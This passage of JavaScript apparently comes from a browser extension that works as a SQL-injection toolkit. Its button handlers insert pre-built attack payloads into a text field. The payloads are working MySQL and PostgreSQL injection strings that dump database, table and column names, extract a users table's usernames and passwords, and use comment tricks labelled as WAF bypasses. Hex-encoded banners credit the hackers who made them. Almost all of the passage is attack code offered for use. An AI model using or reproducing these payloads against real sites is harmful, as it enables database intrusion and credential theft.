					final1 += 'concat%280x3c2f686561643e3c626f6479206267636f6c6f72203d20626c61636b3e3c62723e3c68313e7e3a20496e6a65637465642042792048656c6c657220485348203a7e3c2f68313e3c62723e3c666f6e742073697a653d3620636f6c6f723d677265656e3e4461746162617365203a20,database%28%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f72203d2079656c6c6f772073697a653d363e2055534552203a20,user(),0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d7265642073697a653d373e20486176652053796d6c696e6b203f203a20,@@HAVE_SYMLINK,0x203c2f666f6e743e3c62723e3c666f6e742073697a65203d203520636f6c6f72203d2079656c6c6f773e20486f73746e616d65203a20,@@HOSTNAME,0x3c6469763e3c666f6e7420636f6c6f723d207265643e3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3c2f6469763e3c2f666f6e743e3c2f666f6e743e3c68333e3c666f6e7420636f6c6f72203d726564203e44617461626173657320616e6420436f6c756d6e7320496e666f20203a203c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e,%28SELECT%28@y%29FROM%28SELECT%28@y:=0x00%29,%28@NR:=0%29,%28SELECT%280%29FROM%28INFORMATION_SCHEMA.SCHEMATA%29WHERE%28SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461%29AND%280x00%29IN%28@y:=CONCAT%28@y,LPAD%28@NR:=@NR%2b1,2,0x30%29,0x3a20,schema_name,0x3c62723e%29%29%29%29y%29,0x3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d7e7e7e7e7e7e7e2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3c2f666f6e743e3c62723e,%28select%28@x%29from%28select%28@x:=0x00%29,%28@nr:=0%29,(@tbl:=0x0%29,%28select%280%29from%28information_schema.tables%29where%28table_schema=database%28%29%29and%280x00%29in%28@x:=concat_ws%280x20,@x,lpad%28@nr:=@nr%2b1,3,0x0b%29,0x2e203c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d79656c6c6f773e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,%28select+count%28*%29+from+information_schema.columns+where+table_name=@tbl%29,0x3c2f666f6e743e5d20207d3c2f666f6e743e3c62723e%29%29%29%29x%29,0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d352e333e3d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483d3d3d3d3d7e7e7e7e7e4853487e7e7e7e7e3d3d3d3d3d4853483d3d3d3d3d7e7e7e7e7e4853483c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d79656c6c6f772073697a653d343e4578747261637465642044617461203a203c2f666f6e743e3c62723e3c68313e7e3a2048454c4c45522028204853482029205741532048455245203a7e3c2f68313e203c62723e3c64697620616c69676e3d226c656674223e,%28select+concat%280x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e546f74616c20436f6c756d6e20436f756e7420416c6c20446174616261736573203a7e2048454c4c455227532044494f53207e5b,%28Select+count%28column_name%29from%28information_Schema.columns%29%29,0x5d3c62723e3c62723e2f7e,@%29from%28select%28@:=0x00%29,%28@db:=0%29,%28@db_nr:=0%29,%28@tbl:=0%29,%28@tbl_nr:=0%29,%28@col_nr:=0%29,%28select%28@%29from%28information_Schema.columns%29where%28@%29in%28@:=concat%28@,if%28%28@db!=table_schema%29,concat%28%28@tbl_nr:=0x00%29,0x3c666f6e7420636f6c6f723d7265643e,LPAD%28@db_nr:=@db_nr%2b1,2,0x20%29,0x2e20,@db:=table_schema,0x203c666f6e7420636f6c6f723d707572706c653e207e3a205461626c657320436f756e7420546f74616c203a7e202848454c4c455227732044494f5329205b,%28Select+count%28table_name%29from%28information_schema.tables%29where%28table_schema=@db%29%29,0x5d2f7e3c2f666f6e743e3c2f666f6e743e%29,0x00%29,if%28%28@tbl!=table_name%29,concat%28%28@col_nr:=0x00%29,0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD%28@tbl_nr:=@tbl_nr%2b1,3,0x0b%29,0x202e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a202848656c6c657227732044696f7329207e20205b,%28Select+count%28column_name%29from%28information_Schema.columns%29where%28table_name=@tbl%29%29,0x5d202f203c666f6e7420636f6c6f723d79656c6c6f773e205265636f726473203a2048454c4c455227732044494f537e205b,%28Select+ifnull%28table_rows,0x30%29+from+information_schema.tables+where+table_name=@tbl%29,0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e%29,0x00%29,concat%280x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD%28@col_nr:=@col_nr%2b1,3,0x0b%29,0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e%29%29%29%29%29x%29,0x3c2f6469763e%29';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmdhn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'concat(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070346c613a3a4772656574277320546f20416c6c204861636b6572277320203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d353e44622056657273696f6e203a,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e506f7274203a,@@PORT,0x3c62723e436865636b2069662053796d6c696e6b206973204f4e203a,@@HAVE_SYMLINK,0x3c62723e536572766572204f73204465746563746564203a,@@VERSION_COMPILE_OS,0x3c62723e436865636b207768696368204f70657261746f72732063616e20626520757365204572726f723a,@@FT_BOOLEAN_SYNTAX,0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dmlkmd').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'+div+false+/*!00000UNION*/+/*!00000SELECT*/+/*!00000CONCAT*/(0x3c2f7469746c653e,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)/*!FROM*/(users)WHERE(@x:=/*!00000CONCAT*/(@x,0x3c62723e,username,0x207c20,password))))x))--+";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#dwtrjn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dwmdbld').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dwmdblx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dwzen').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dwdhn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dpstr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dpfpsr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dpprstg').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dmrmm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvbdnm').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvcnt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a2920203c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a2920203c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvprmtb').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvdbpc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvinfst').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dvinfscl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#edvrsn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#erdtbs').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#edgtbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

